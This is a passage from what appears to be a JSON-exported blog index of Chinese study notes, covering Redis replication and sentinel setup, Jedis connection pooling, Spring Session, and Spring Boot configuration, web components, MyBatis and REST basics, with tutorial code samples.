6381\n让6379成为6381的从机，此时6381既是主机又是从机，但他不能读。\n\n\n\n\n小结：一台主机配置多台从机，一台从机也可以配置多台从机，从而形成一个庞大的集群。减轻一台主机的压力，但是增加了服务间的延迟。\n\nRedis的哨兵模式主机宕机、从机上位的自动版\n\n搭建一主二从的redis集群(见上文)\n提供哨兵的配置文件：\n在redis安装目录下下创建配置文件：redis_sentinel.conf\n写入 sentinel monitor dc-redis 127.0.0.1 6379 1\n\n\n启动哨兵服务：redis-sentinel redis_sentinel.conf\n主机宕机，哨兵自动选择从机上位\n原主机恢复，自动从属于新主机\n\n\n哨兵小结可以设置多个哨兵。即每个redis服务都可以设置一个哨兵。哨兵模式三大任务：监控、提醒、自动故障迁移\n\nJedis操作Redis使用Redis官方推荐的Jedis，在Java应用中操作Redis。操作Redis的命令在jedis中以方法形式出现。Jedis文档\nmaven配置\n&lt;dependency&gt;  &lt;groupId&gt;redis.clients&lt;/groupId&gt;  &lt;artifactId&gt;jedis&lt;/artifactId&gt;  &lt;version&gt;4.2.2&lt;/version&gt;&lt;/dependency&gt;\n示例java程序\npackage org.example;import redis.clients.jedis.Jedis;import java.util.Set;public class Main &#123;    public static void main(String[] args) &#123;        //连接redis        Jedis jedis = new Jedis(&quot;127.0.0.1&quot;, 6379);        //使用jedis对象操作redis服务        Set&lt;String&gt; ret = jedis.keys(&quot;*&quot;);        System.out.println(ret);    &#125;&#125;\n输出：[]\nJedis中连接池的使用工具类\npackage org.example;import redis.clients.jedis.JedisPool;import redis.clients.jedis.JedisPoolConfig;public class RedisUtils &#123;    private static JedisPool pool;    //创建JedisPool对象    public static JedisPool open(String ip, int port) &#123;        if (pool == null) &#123;            //创建JedisPool            //创建JedisPoolConfig，给config设置连接池的参数，使用config对象创建JedisPool            JedisPoolConfig config = new JedisPoolConfig();            //给config设置连接池的参数            //设置最大线程数，一个线程就是一个Jedis            config.setMaxTotal(20);            //设置最大空闲数            config.setMaxIdle(2);            //设置检查项为true，表示从线程池中获取的对象一定是经过检查可用的            config.setTestOnBorrow(true);            //创建Pool对象            /*             * poolConfig:配置器JedisPoolConfig             * host:redis所在linux的ip             * port:redis的端口             * timeout:链接redis超时，毫秒值             * password:链接redis的访问密码             */            pool = new JedisPool(config, ip, port, 6000);        &#125;        return pool;    &#125;    //关闭Pool对象    public static void close() &#123;        if (pool != null) &#123;            pool.close();        &#125;    &#125;&#125;\n测试类\npackage org.example;import redis.clients.jedis.Jedis;import redis.clients.jedis.JedisPool;import java.util.Set;public class Main &#123;    public static void main(String[] args) &#123;        String host = &quot;127.0.0.1&quot;;        int port = 6379;        //创建JedisPool对象，从JedisPool中获取Jedis        JedisPool pool = null;        Jedis jedis = null;        try &#123;            pool = RedisUtils.open(host, port);            //从pool中获取Jedis            jedis = pool.getResource();            Set&lt;String&gt; ret = jedis.keys(&quot;*&quot;);            System.out.println(ret);        &#125; finally &#123;            //关闭Jedis对象，把Pool中获取的Jedis放回Pool，供其他请求使用。            if (jedis != null) &#123;                jedis.close();            &#125;        &#125;    &#125;&#125;\n输出：[]\nRedis客户端工具——Redis Desktop Manager使用命令行还行，就不用客户端了。贴个官网链接\n总结\nRedis的学习告一段落，其中用的最多的应该还是对数据的操作。\n\n","categories":["学习笔记"],"tags":["Redis","数据库"]},{"title":"SpringSession笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SpringSession%E7%AC%94%E8%AE%B0/","content":"Session会话管理session与cookiesession：因为http协议是无状态的，所以一次会话结束后，下次再会话时，服务端并不知道是上次这个人，所以服务端需要记录用户的状态时，需要session机制来识别具体的用户。\ncookie：每次http请求时，客户端都会发送相应的cookie信息。大多数应用都是使用cookie来实现session跟踪的。即第一次创建session时，服务端在http协议中向客户端cookie中记录一个sessionID，以后每次请求会把这个会话id发送到服务端，这样服务端可以识别用户。\n如果cookie被禁用了，可以重写url，即将sessionID写到url中实现参数传递。（不过一般不会这么做\nSession机制存放过程：每次请求浏览器都会将Cookie数据传给Tomcat每次服务器响应请求都会携带一个Cookie数据，将SessionId写入浏览器（已有则会覆盖。 \n\ntomcat接受用户请求后，会从cookie中寻找name为sessionid的数据。\n如果Cookie中没有，则服务器需要创建一个新的Session对象及sessionid。\n如果有，则tomcat会获取这个数据，然后在Session容器中，根据sessionid获取数据。\n数据存在，表示这个session有效\n数据不存在，则表示这个session已经过期。tomcat会创建一个新的session及sessionid，记录并写入浏览器。\n\n\n\n\n\n集群后，session丢失的原因：多台tomcat之间无法共享session。tomcat容器关闭或重启，也会导致session会话失效。\nsession会话共享方案\n使用容器扩展插件来实现，比如就tomcat的tomcat-redis-session-manager插件，基于jetty的jetty-session-redis插件、memcatched-session-manager插件； 好处：无需改动代码 坏处：过于依赖容器，容器升级或更换，需要重新配置。底层是复制session到其他服务器，会有一定延迟，不能部署太多服务器。\n使用Nginx负载均衡的ip hash策略，实现用户每次访问都绑定到同一tomcat服务器，实现session总是存在。 局限性：ip不可变。其次，负载均衡时，如果某个服务器发生故障，会重新定位，也会跳到别的服务器。\n自己写一套session会话管理工具类。 比较灵活，但开发需要一些额外时间，同时功能可能较弱。（不要重复造轮子\n使用框架的会话管理工具，SpringSession。 不依赖容器，不惜要改代码。较为完美的方案\n\nSpringSession简介SpringSession是Spring家族中的一个子项目，提供了一组Api和实现，用于管理用户Session信息。它将servlet容器实现的httpSession替换为spring-session，专注于解决session管理问题，Session信息存储在Redis中，可简单快速且无缝的集成到应用中。\nSpringSession特性：\n\n提供用户session管理的api和实现\n提供HttpSession，以中立的方式取代web容器中的session\n支持集群的session处理，不必绑定到具体的web容器去解决集群下的session共享问题\n\nSpringSession redis依赖\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.session&lt;/groupId&gt;    &lt;artifactId&gt;spring-session-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;\n\n然后，配置好redis。用户的session信息就会存储在redis中实现共享。\nSpringSession的实现原理大概的实现原理\n\n自定义Filter，实现doFilter方法\n集成HttpServletRequestWrapper、HttpServletResponseWrapper类，重写getSession等相关的方法，在这些方法中调用session存储容器的操作类。比如redis等\n在1中的doFilter里，new 2中自定义的request和response类，将他们分别传递到过滤器链上\n将这个过滤器配置到过滤器链的第一个位置上\n\n结尾以后深入了，应该会有补充。比如使用场景之类的目前经验不足，就写到这吧。\n","categories":["学习笔记"],"tags":["spring","session"]},{"title":"SpringBoot笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SpringBoot%E7%AC%94%E8%AE%B0/","content":"第一章 xml与JavaConfig\n为什么要使用springboot因为Spring、SpringMVC需要使用大量的配置文件（xml文件）还需要配置各种对象，把使用的对象放到spring容器中才能使用对象需要了解其他框架的配置规则比较繁琐\nSpringBoot相当于 不需要配置文件的Spring+SpringMVC。常用的框架和第三方库都已经配置好了，直接用。\nSpringBoot开发效率高，使用更方便。\n\n@JavaConfigjavaConfig：使用java类作为xml配置文件的代替，是配置spring容器的纯Java方式。在这个Java类中可以创建Java对象，把对象放入sprig容器中（注入到容器）。使用两个注解：\n\n@Configuration：放在一个类上，表示这个类作为配置文件使用。\n@Bean：放在方法上，声明对象，把这个对象注入到容器。相当于\n\n使用示例\npackage org.example;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;/** * Configuration：表示当前类作为配置文件使用。是用来配置容器的 * 位置：在类上 *  * 这个类相当于beans.xml */@Configurationpublic class SpringConfig &#123;    /**     * 创建方法，方法返回值为对象。方法上加入@bean注解     * 方法返回值对象就注入到容器中     *     * @Bean: 把对象注入到Spring容器中。作用相当于&lt;bean&gt;     * 位置：在方法上     * 说明：@Bean，不指定对象名称，默认方法名是id     */    @Bean    public Student createStudent() &#123;        Student s1 = new Student();        s1.setName(&quot;张三&quot;);        s1.setId(1);        return s1;    &#125;    @Bean(name = &quot;student2&quot;)    public Student createStudent2() &#123;        Student s2 = new Student();        s2.setName(&quot;李四&quot;);        s2.setId(2);        return s2;    &#125;&#125;\n\n@ImportResource@ImportResource：导入其他的xml配置文件，等于在xml &lt;import resources=&quot;其他配置文件&quot;/&gt;使用示例\n@ImportResource(value = &#123;&quot;classpath:applicationContext.xml&quot;,&quot;classpath:beans.xml&quot;&#125;)public class SpringConfig &#123;&#125;\nvalue参数可以是数组，以导入多个xml配置文件  \n@PropertyResource@PropertyResource： 读取properties属性配置文件可以实现外部化配置，在程序代码之外提供数据。步骤：\n\n在resources目录下，创建properties文件，使用key&#x3D;value的格式提供数据\n在PropertyResource指定properties文件的位置\n使用@Value(value&#x3D;”${key}”)\n\n@Configuration@ImportResource(value = &quot;classpath:applicationContext.xml&quot;)@PropertySource(value = &quot;classpath:config.properties&quot;)@ComponentScan(basePackages = &quot;org.example.vo&quot;)public class SpringConfig &#123;&#125;\n\n第二章 SpringBoot介绍Spring官网SpringBoot是Spring中的一个成员，可以简化Spring，SpringMVC的使用。核心还是IOC容器。\n特点\n\nCreate stand-alone Spring applications  创建Spring应用\nEmbed Tomcat, Jetty or Undertow directly (no need to deploy WAR files)  内嵌的tomcat，jetty，undertow服务器（不用部署war包）\nProvide opinionated ‘starter’ dependencies to simplify your build configuration  提供了starter起步依赖，来简化应用的配置  比如使用MyBatis框架，需要在Spring项目中，配置MyBatis的对象SqlSessionFactory，Dao的代理对象  在SpringBoot项目中，在pom.xml中，加入一个mybatis-spring-boot-starter依赖\nAutomatically configure Spring and 3rd party libraries whenever possible  尽可能去配置spring和第三方库，自动配置（将spring和第三方库中的对象创建好，放入容器中，以便于使用）\nProvide production-ready features such as metrics, health checks, and externalized configuration  提供了健康检查，统计，外部化配置\nAbsolutely no code generation and no requirement for XML configuration  不用生成代码，不用使用xml做配置\n\n创建SpringBoot项目使用Spring提供的初始化器，即向导创建SpringBoot应用\n使用的地址：https://start.spring.io国内的地址：https://start.springboot.io也可以直接访问网址，创建并下载。\nSpringBoot的目录结构：\n注解的使用@SpringBootApplication复合注解：由@SpringBootConfiguration@EnableAutoConfiguration@ComponentScan组成\n\n@SpringBootConfiguration部分源码：\n\n@Configurationpublic @interface SpringBootConfiguration &#123;    @AliasFor(        annotation = Configuration.class    )    boolean proxyBeanMethods() default true;&#125;\n说明：使用了@SpringBootConfiguration注解标注的类，可以作为配置文件使用，可以使用BEAN声明对象，注入到容器。2. @SpringBootConfiguration启用自动配置，把java对象配置好，注入到spring容器中。例如：将MyBatis对象创建好，放入到容器中。3. @ComponentScan扫描器，找到注解，根据注解功能创建对象，给属性赋值等。默认扫描的包：@ComponentScan所在的包和子包。\nSpringBoot的配置文件配置文件名称：application拓展名：properties(key&#x3D;value);yml(ket:value)使用application.properties或application.yml\napplication.properties示例：\n#设置端口号server.port=8080#设置访问应用上下文路径，contextpathserver.servlet.context-path=/boot\n\napplication.yml示例：\nserver:  port: 8080  servlet:    context-path: /boot\n\n注：properties与yml同时存在时，会使用properties。（一般只是用一个，不要两个一起用）\n多环境配置有开发环境，测试环境，上线环境。每个环节都有不同的配置信息，例如端口，上下文件，数据库url，用户名，密码等。\n使用多环境配置文件，可以方便切换不同的配置。使用方式：创建多个配置文件，名称规则：application-环境名称.properties(yml)\n创建开发环境的配置文件：application-dev.properties(application-dev.yml)创建测试环境的配置文件：application-test.properties\n在application.properties中指定使用哪个配置文件\n#激活使用哪个配置文件spring.profiles.active=dev\n\n自定义配置@Value(“${key}”)key来自application.properties\nstudent.name=咕咕咕student.age=20\n注解加在属性定义上，便能读取配置中的数据。\n@Controllerpublic class SpringBoot &#123;    @Value(&quot;$&#123;student.name&#125;&quot;)    private String name;    @RequestMapping(value = &quot;/hello&quot;, produces = &quot;application/json&quot;)    @ResponseBody    public String hello() &#123;        return &quot;hello,&quot; + name;    &#125;&#125;\n\n@ConfigurationProperties(prefix&#x3D;”…”)将整个文件映射为一个对象，用于自定义配置项比较多的情况。在类上加上@Component@ConfigurationProperties(prefix &#x3D; “student”)注解，prefix内为属性名\npackage com.example.vo;import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.stereotype.Component;@Component@ConfigurationProperties(prefix = &quot;student&quot;)public class Student &#123;    private String name;    private String age;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getAge() &#123;        return age;    &#125;    public void setAge(String age) &#123;        this.age = age;    &#125;    @Override    public String toString() &#123;        return &quot;Student&#123;&quot; +                &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; +                &quot;, age=&#x27;&quot; + age + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;&#125;\n\n在Controller中使用@Resource自动注入，从容其中拿到对象，进行赋值使用。\nSpringBoot中使用jsp(不推荐使用jsp，因为前后端要分离)SpringBoot不推荐使用jsp，而是使用模板技术代替jspSpringBoot原生不支持jsp，需要配置依赖项。  \n\n加入一个处理jsp的依赖，负责编译jsp文件。\n\n&lt;dependency&gt;    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;    &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt;&lt;/dependency&gt;\n\n如果需要使用servlet，jsp，jstl的功能，还需要添加额外的依赖项。\n\n&lt;dependencys&gt;    &lt;!--jstl的依赖--&gt;    &lt;dependency&gt;        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;        &lt;artifactId&gt;jstl&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;!--servlet的依赖--&gt;    &lt;dependency&gt;        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;        &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;!--jsp的依赖--&gt;    &lt;dependency&gt;        &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt;        &lt;artifactId&gt;javax.servlet.jsp-api&lt;/artifactId&gt;        &lt;version&gt;2.3.3&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencys&gt;\n\n\n创建一个存放jsp的目录，一般叫webapp index.jsp\n需要在pom.xml指定jsp文件编译后的存放目录 META-INF&#x2F;resources\n创建Controller，访问jsp\n在application.properties文件中配置视图解析器\n\n使用示例：index.jsp\n&lt;%@ page contextType=&quot;text/html;charset=UTF-8” language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;jsp文件&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h3&gt;使用jsp显示Controller中的数据 $&#123;data&#125;&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;\nController类\npackage com.example;import org.springfarmework.stereotype.Controller;@Controllerpublic class JspController&#123;//    public String Jsp(HttpServletRequest request)&#123;//        request.setAttribute(&quot;data&quot;,&quot;SpringBoot使用jsp&quot;);//        //视图的逻辑名称//        return &quot;index&quot;;//    &#125;    /**     *      * @param model     * @return     */    public String Jsp(Model model)&#123;        //将数据放入到request作用域        model.addAttribute(&quot;data&quot;,&quot;SpringBoot使用jsp&quot;);        //视图的逻辑名称        return &quot;index&quot;;    &#125;    &#125;\napplication.properties中添加\n#配置视图解析器 前缀及后缀#/ = src/main/webappspring.mvc.view.prefix=/spring.mvc.view.suffix=.jsp\npom.xml文件中，指定jsp编译后存放的目录。\n&lt;resources&gt;    &lt;resource&gt;        &lt;!--jsp原来的目录--&gt;        &lt;directory&gt;src/main/webapp&lt;/directory&gt;        &lt;!--指定编译后的存放目录--&gt;        &lt;directory&gt;META_INF/resources&lt;/directory&gt;        &lt;!--指定处理的目录和文件--&gt;        &lt;includes&gt;            &lt;include&gt;**/*.*&lt;/include&gt;        &lt;/includes&gt;    &lt;/resource&gt;&lt;/resources&gt;\n\njsp正在被逐渐淘汰，因为它在页面中嵌入了java代码。使得前后端不能分离，从而加大了前端与后端的沟通成本，降低了开发效率。比如下面的对话(来自网络)\n\n后端：你写的页面有问题啊，不显示数据。前端：不可能，我这边都是好的。后端：你自己来看啊。前端：你写的这是什么玩意？我给你的代码不是这样的。后端：我得把你的代码加到 JSP 里啊。前端：我又不懂 JSP 啊，你再把代码摘出来吧，我帮你看看问题。后端：……\n\n可以使用ajax技术，实现前后端分离。\n使用容器通过代码，从容器中获取对象。在main方法中SpringApplication.run()方法获取返回的String容器对象，再获取业务bean进行调用。\nrun()方法的源码：\npublic static ConfigurableApplicationContext run(Class&lt;?&gt; primarySource, String... args) &#123;    return run(new Class[]&#123;primarySource&#125;, args);&#125;\nConfigurableApplicationContext：接口，是ApplicationContext的子接口\n使用示例：手动从容器中获取UserService对象，调用其中的sayHello方法。\n@SpringBootApplicationpublic class SpringBootDemo001Application &#123;    public static void main(String[] args) &#123;        //获取容器对象        //ConfigurableApplicationContext ctx = SpringApplication.run(SpringBootDemo001Application.class, args);        ApplicationContext ctx = SpringApplication.run(SpringBootDemo001Application.class, args);        //从容器中获取对象        UserService userService = (UserService) ctx.getBean(&quot;UserService&quot;);        userService.sayHello(&quot;张三&quot;);    &#125;&#125;\n\nCommandLineRunner接口、ApplicationRunner接口这两个接口都有一个run方法。执行时间在容器对象创建好后，自动执行run()方法。可以完成自定义的在容器对象创建好的一些操作。\n源码：\n@FunctionalInterfacepublic interface CommandLineRunner &#123;    void run(String... args) throws Exception;&#125;@FunctionalInterfacepublic interface ApplicationRunner &#123;    void run(ApplicationArguments args) throws Exception;&#125;\n\n他们在容器启动完成后执行。我们只需要实现这个方法，就可以在容器启动后执行一些内容。比如读取配置文件，数据库连接之类。\n使用示例：\npublic class AfterRun implements CommandLineRunner &#123;    @Override    public void run(String... args) throws Exception &#123;        //可做自定义操作        System.out.println(&quot;在容器对象创建好，执行的方法&quot;);    &#125;&#125;\n\n第三章 Web组件拦截器、servlet、Filter\n拦截器拦截器是SpringMVC中的一种对象，能拦截对Controller的请求。拦截器框架中由系统的拦截器，可以自定义拦截器。实现对请求的预先处理。\nSpringMVC实现自定义拦截器：\n\n创建类实现SpringMVC框架的HandlerInterceptor接口\n\npublic interface HandlerInterceptor &#123;    default boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        return true;    &#125;    default void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView modelAndView) throws Exception &#123;    &#125;    default void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable Exception ex) throws Exception &#123;    &#125;&#125;\n\n需在SpringMVC的配置文件中，声明拦截器\n\n&lt;mvc:interceptors&gt;    &lt;mvc:interceptor&gt;        &lt;mvc:mapping path=&quot;url&quot;/&gt;        &lt;bean class=&quot;拦截器的全限定名称&quot;/&gt;    &lt;/mvc:interceptor&gt;&lt;/mvc:interceptors&gt;\n\nSpringBoot实现拦截器：\n\n自定义拦截器\n\npackage com.example.web;import org.springframework.web.servlet.HandlerInterceptor;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;/** * 自定义的拦截器 */public class LoginInterceptor implements HandlerInterceptor &#123;    /**     * @param request     * @param response     * @param handler  被拦截的控制器对象     * @return boolean     * true：请求被Controller处理     * false：请求被拦截     */    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        //判断是否通过拦截器的代码        System.out.println(&quot;拦截器被执行&quot;);        return true;    &#125;&#125;\n\n将拦截器对象注入容器\n\npackage com.example.config;import com.example.web.LoginInterceptor;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class HandlerInterceptorConfig implements WebMvcConfigurer &#123;    //添加拦截器对象，注入到容器中    @Override    public void addInterceptors(InterceptorRegistry registry) &#123;        //创建拦截器对象        HandlerInterceptor interceptor = new LoginInterceptor();        //指定拦截的url请求        String path[] = &#123;&quot;/user/**&quot;&#125;;        //指定不拦截的地址        String excludePath[] = &#123;&quot;/user/login&quot;&#125;;        registry.addInterceptor(interceptor).addPathPatterns(path).excludePathPatterns(excludePath);    &#125;&#125;\n\n写Controller类进行测试\n\npackage com.example.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;@Controllerpublic class HandlerInterceptorController &#123;    @RequestMapping(&quot;/user/register&quot;)    @ResponseBody    public String userRegister()&#123;        return &quot;访问/user/register&quot;;    &#125;    @RequestMapping(&quot;/user/login&quot;)    @ResponseBody    public String userLogin()&#123;        return &quot;访问/user/login&quot;;    &#125;&#125;\n\nServlet在SpringBoot中使用Servlet对象使用步骤：\n\n创建Servlet类。创建类继承HttpServlet。\n\npackage com.example.web;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;//创建Servlet类public class Servlet extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        doPost(req, resp);    &#125;    @Override    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        //使用HttpServletResponse输出数据，应答结果        resp.setContentType(&quot;text/html;charset=utf-8&quot;);        PrintWriter out = resp.getWriter();        out.println(&quot;执行servlet&quot;);        out.flush();        out.close();    &#125;&#125;\n\n注册Servlet，让框架能找到Servlet。\n\npackage com.example.config;import com.example.web.Servlet;import org.springframework.boot.web.servlet.ServletRegistrationBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class ServletConfig &#123;    //定义方法，注册Servlet对象    @Bean    public ServletRegistrationBean servletRegistrationBean()&#123;        //public ServletRegistrationBean(T servlet, String... urlMappings)        //第一个参数是Servlet对象，第二个参数是url地址        //ServletRegistrationBean bean = new ServletRegistrationBean(new Servlet(),&quot;/servlet&quot;);        //无参构造，单独设置参数        ServletRegistrationBean bean = new ServletRegistrationBean();        bean.setServlet(new Servlet());        bean.addUrlMappings(&quot;/servlet_01&quot;,&quot;/servlet_02&quot;); // &lt;url-pattern&gt;        return bean;    &#125;&#125;\n\nFilter过滤器Filter是Servlet规范中的过滤器，可以处理请求，对请求的参数、属性进行调整。常常在过滤器中处理字符编码使用步骤：\n\n创建自定义的过滤器类\n\npackage com.example.config;import com.example.web.MyFilter;import org.springframework.boot.web.servlet.FilterRegistrationBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class FilterConfig &#123;    @Bean    public FilterRegistrationBean filterRegistration() &#123;        FilterRegistrationBean bean = new FilterRegistrationBean();        bean.setFilter(new MyFilter());        bean.addUrlPatterns(&quot;/user/*&quot;);        return bean;    &#125;&#125;\n\n注册Filter过滤器对象\n\npackage com.example.config;import com.example.web.MyFilter;import org.springframework.boot.web.servlet.FilterRegistrationBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class FilterConfig &#123;    @Bean    public FilterRegistrationBean filterRegistration() &#123;        FilterRegistrationBean bean = new FilterRegistrationBean();        bean.setFilter(new MyFilter());        bean.addUrlPatterns(&quot;/user/*&quot;);        return bean;    &#125;&#125;\n\n写Controller类进行测试\n\npackage com.example.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;@Controllerpublic class HandlerInterceptorController &#123;    @RequestMapping(&quot;/user/register&quot;)    @ResponseBody    public String userRegister()&#123;        return &quot;访问/user/register&quot;;    &#125;    @RequestMapping(&quot;/user/login&quot;)    @ResponseBody    public String userLogin()&#123;        return &quot;访问/user/login&quot;;    &#125;    @RequestMapping(&quot;/query&quot;)    @ResponseBody    public String query()&#123;        return &quot;访问/query&quot;;    &#125;&#125;\n\n字符集过滤器CharacterEncodingFilter：解决post请求中乱码的问题在SpringMVC框架，在web.xml中注册过滤器。配置它的属性\n\n使用系统提供的字符集过滤器类过滤器的注册\n\npackage com.example.config;import org.springframework.boot.web.servlet.FilterRegistrationBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.filter.CharacterEncodingFilter;@Configurationpublic class FilterConfig &#123;    @Bean    public FilterRegistrationBean filterRegistration() &#123;        FilterRegistrationBean bean = new FilterRegistrationBean();        //使用框架中的过滤器类        CharacterEncodingFilter filter = new CharacterEncodingFilter();        //指定使用的编码方式        filter.setEncoding(&quot;utf-8&quot;);        //指定request，response都使用encoding的值        filter.setForceEncoding(true);        bean.setFilter(filter);        //指定过滤的url地址        bean.addUrlPatterns(&quot;/*&quot;);        return bean;    &#125;&#125;\n同时需要关闭SpringBoot中默认配置的字符集过滤器，使自定义的过滤器起作用。\n#SpringBoot中默认已经配置了Character Encoding Filter，默认编码ISO-8859-1#设置enable=false 作用是关闭系统中配置好的过滤器，使用自定义的CharacterEncodingFilterserver.servlet.encoding.enabled=false\n\n直接修改application.properties配置\n\n#让系统的CharacterEncodingFilter生效server.servlet.encoding.enabled=true#指定使用的编码方式server.servlet.encoding.charset=UTF-8#强制request、response都使用charset属性的值server.servlet.encoding.force=true\n\n第四章 ORM操作MySQLORM是“对象-关系-映射”的简称。（Object Relational Mapping，简称ORM）orm其实就是将类对象的语法翻译成sql语句的一个引擎\n使用MyBatis框架操作数据库，在SpringBoot框架集成MyBatis使用步骤：\n\nmybatis起步依赖：完成mybatis对象自动配置，对象放在容器中。\npom.xml指定把src&#x2F;main&#x2F;java目录中的xml文件包含到classpath中。\n创建实体类Student。\n创建Dao接口StudentDao，创建一个查询学生的方法。\n穿啊关键Dao接口对应的Mapper文件，xml文件，写sql语句。\n创建Service层对象，创建StudentService接口和他的实现类。调dao对象的方法，完成数据库的操作。\n创建Controller对象，访问Service。\n写application.properties文件配置数据库的连接信息\n\n第一种方式：@Mapper@Mapper：放在dao接口上，每个接口都需要使用这个注解。\n/** * @Mapper： 告诉MyBatis这是dao接口，创建此接口的代理对象 *      位置：在类上 */@Mapperpublic interface StudentDao &#123;    Student selectById(@Param(&quot;stuId&quot;) Integer id);&#125;\n\n第二种方式：@MapperScan@MapperScan：放在SpringBoot启动类上，在包下所有接口在编译后会生成相应的实现类。\n@SpringBootApplication/** * @MapperScan：找到Dao接口和Mapper文件 *      basePackages：Dao接口所在的包名 */@MapperScan(basePackages = &#123;&quot;com.example.dao&quot;&#125;)public class SpringBootDemo001Application implements CommandLineRunner &#123;    //..&#125;\n\n第三种方式：Mapper文件和Dao接口分开管理将mapper文件放在resources目录下\n\n在resources目录中创建子目录（自定义），例如mapper\n将mapper文件放在mapper目录\n在application文件中指定mapper文件的目录\n\n#指定mapper文件的位置mybatis.mapper-locations=classpath:mapper/*.xml#指定mybatis的日志mybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl\n\n在pom文件中指定resources目录中的文件，编译到目标目录中\n\n&lt;!--resources插件--&gt;&lt;resources&gt;    &lt;resource&gt;        &lt;directory&gt;src/main/resources&lt;/directory&gt;        &lt;includes&gt;            &lt;include&gt;**/*.*&lt;/include&gt;        &lt;/includes&gt;    &lt;/resource&gt;&lt;/resources&gt;\n\n事务Spring框架中的事务：\n\n管理事务的对象：事务管理器（接口，接口有很多实现类） 例如：使用jdbc或mybatis访问数据库，使用的事务管理器：DataSourceTransactionManager\n声明式事务：在xml配置文件或使用注释说明事务控制的内容 控制事务：隔离级别，传播行为，超时时间\n事务处理方式：\nspring框架中的@Transactional\naspectj框架可以在xml配置文件中，声明事务控制的内容\n\n\n\nSpringBoot中使用事务：\n\n在业务方法上加入@Transactional，加入注解后，方法有事务功能。\n明确的在启动类上，加入@EnableTransactionManager\n\n第五章 接口的架构风格——RESTfulAPI百度百科接口：应用程序接口（英语：Application Programming Interface，简称：API），又称为应用编程接口，就是软件系统不同组成部分衔接的约定。由于近年来软件的规模日益庞大，常常需要把复杂的系统划分成小的组成部分，编程接口的设计十分重要。程序设计的实践中，编程接口的设计首先要使软件系统的职责得到合理划分。良好的接口设计可以降低系统各部分的相互依赖，提高组成单元的内聚性，降低组成单元间的耦合程度，从而提高系统的维护性和扩展性。接口：可以指访问servlet、controller的url，调用其他程序的 函数\n架构风格：api的组织样式    就是一个传统的：http://localhost:8080/dev/student/query?id=2\nRESTRESTful架构风格\n\nREST：(Representational State Transfer)表现层状态转移 是一种接口的架构风格和设计的理念，不是标准。 优点：更简洁，更有层次。 表现层状态转移： 表现层就是视图层，显示资源的。通过视图页面、jsp等显示操作资源的结果。 状态：资源变化 转移：资源是可以变化的。资源能创建，new状态，资源创建后可以查询资源，可以被修改。\nRESt中的要素： 用RESt表示资源和对应资源的操作。在互联网中，表示一个资源或者一个操作。 资源是用url表示的，在互联网中，使用的图片、视频、文本、网页等都是资源。 对于资源：\n查询资源：通过url找到资源\n创建资源：添加资源\n更新资源：更新资源，编辑\n删除资源：删除 资源使用url表示，通过名称表示资源  在url中，使用名词表示资源，以及访问资源的信息，在url中，使用”&#x2F;“分割对资源的信息 使用http中的动作（请求方式），表示对资源的操作（CURD）\n\n\nGET：查询资源——sql select处理单个资源：http://localhost:8080/dev/student/query/2处理多个资源：http://localhost:8080/dev/student/query/2/3\nPOST：创建资源——sql inserthttp://localhost:8080/dev/student/add在post请求中传递数据\nPUT：更新资源——sql updatehttp://localhost:8080/dev/student/query/2在post中传递数据\nDELETE：删除资源——sql deletehttp://localhost:8080/dev/student/query/2 需要分页、排序等参数，依然可以加在url后，比如： 